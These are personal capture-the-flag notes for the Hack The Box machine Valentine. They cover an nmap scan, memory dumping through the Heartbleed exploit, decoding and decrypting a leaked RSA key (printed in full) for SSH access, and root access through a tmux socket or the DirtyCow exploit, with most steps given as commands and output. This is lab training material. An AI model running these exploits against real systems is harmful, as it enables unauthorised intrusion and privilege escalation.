# HTB - Valentine  10.10.10.79



- Linux 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
- Ubuntu 12.04 LTS \n \l


- Exploit Hearth bleed leak to get base64 encoded key
- Use gobuster to find /dev
- Get /dev/hope_key, a hex encoded RSA key
- Once decoded the RSA is encryted
- Decrypt RSA Key with  Hearth bleed key => Hope RSA key
- ssh as hope with rsa_key

- Use firefart dirtycow
- or use sbit tmux program



## Walkthrough

- https://0xdf.gitlab.io/2018/07/28/htb-valentine.html



## NMap


```
# nmap -A -p-  10.10.10.79
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-18 15:18 CEST
Nmap scan report for 10.10.10.79
Host is up (0.032s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE  VERSION

22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)

80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2019-09-18T13:14:52+00:00; -4m32s from scanner time.

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).


```

## 22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 





## 80/tcp  open  http     Apache httpd 2.2.22 

![](images/http_10.10.10.79_80_index_php.jpg)

Heartbleed logo..


- /index.php
- /dev
- /encode.php
- /decode.php

![](images/http_10.10.10.79_80_dev.jpg)
- /dev/
    - hype_key
    - notes.txt

```
cat notes.txt
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

## Hearth bleed


```
# searchsploit heartbleed
------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                  |  Path
                                                                                                | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------ ----------------------------------------
OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versi | exploits/multiple/remote/32764.py
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                             | exploits/multiple/remote/32791.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)              | exploits/multiple/remote/32998.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                                | exploits/multiple/remote/32745.py
------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result
Papers: No Result
root@kali:~/htb/YoloToolbox/machines/htb/valentine# searchsploit -m exploits/multiple/remote/32745.py
  Exploit: OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure
      URL: https://www.exploit-db.com/exploits/32745
     Path: /usr/share/exploitdb/exploits/multiple/remote/32745.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /root/htb/YoloToolbox/machines/htb/valentine/32745.py

```

```
# python 32745.py 10.10.10.79 | grep -v '00 00 00 00'
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 885
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................

WARNING: server returned more data than it should - server is vulnerable!
root@kali:~/htb/YoloToolbox/machines/htb/valentine# 
```

Run it lot of times to get random info
```
mkdir data_dump
root@kali:~/htb/YoloToolbox/machines/htb/valentine# for i in $(seq 1 100000); do python 32745.py 10.10.10.79 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" > data_dump/data_dump$i; done
```
Remove duplicate repsonses
```
apt install fdupes
fdupes -rf . | grep -v '^$' > files
xargs -a files rm -v
```

```
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==   => heartbleedbelievethehype 
```



### Hype_key

Decode

```
# cat hype_key | xxd -r -p
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED                                   <======== ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----


cat hype_key | xxd -r -p > hype_key_encrypted
```

Use openssl to decrypt
```
# openssl rsa -in key_rsa.priv -out hype_key_decrypted
Enter pass phrase for key_rsa.priv: heartbleedbelievethehype  <=== heartbleed leaked key
writing RSA key
```



## 443/tcp open  ssl/http Apache httpd 2.2.22

- ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb

Use this key with ssh

```
# ssh -i hype_key_decrypted hype@10.10.10.79
The authenticity of host '10.10.10.79 (10.10.10.79)' can't be established.
ECDSA key fingerprint is SHA256:lqH8pv30qdlekhX8RTgJTq79ljYnL2cXflNTYu8LS5w.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.79' (ECDSA) to the list of known hosts.

Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3

hype@Valentine:~$ id
uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)

hype@Valentine:~$ cat Desktop/user.txt 
XXXXXXXXXXXXXXXXXXXX
```


## System

```
hype@Valentine:~$ uname -a
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
hype@Valentine:~$ cat /etc/issue
Ubuntu 12.04 LTS \n \l
```


## Priv elevation



```
hype@Valentine:/tmp$ history
    1  exit
    2  exot
    3  exit
    4  ls -la
    5  cd /
    6  ls -la
    7  cd .devs
    8  ls -la
    9  tmux -L dev_sess 
   10  tmux a -t dev_sess 
   11  tmux --help
   12  tmux -S /.devs/dev_sess 
   13  exit

$ tmux -S /.devs/dev_sess
root@Valentine:/tmp# 
cat /root/root.txt
XXXXXXXXXXXXXX
```



## Meth2 : Dirty cow : ok

Dans /tmp/dirty.c
Copy/colle https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c

```

./dirty bob
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: bob
Complete line:
firefart:fibHiHVlzylTM:0:0:pwned:/root:/bin/bash

mmap: 7fbc66eb7000  <========================== Prend du temps


madvise 0            <=====================1 ou 2 minutes...

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'bob'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'bob'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
hype@Valentine:/tmp$ 
hype@Valentine:/tmp$ 
hype@Valentine:/tmp$ cat /etc/passwd
firefart:fibHiHVlzylTM:0:0:pwned:/root:/bin/bash
/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync

sudo - firefart
password : bob

```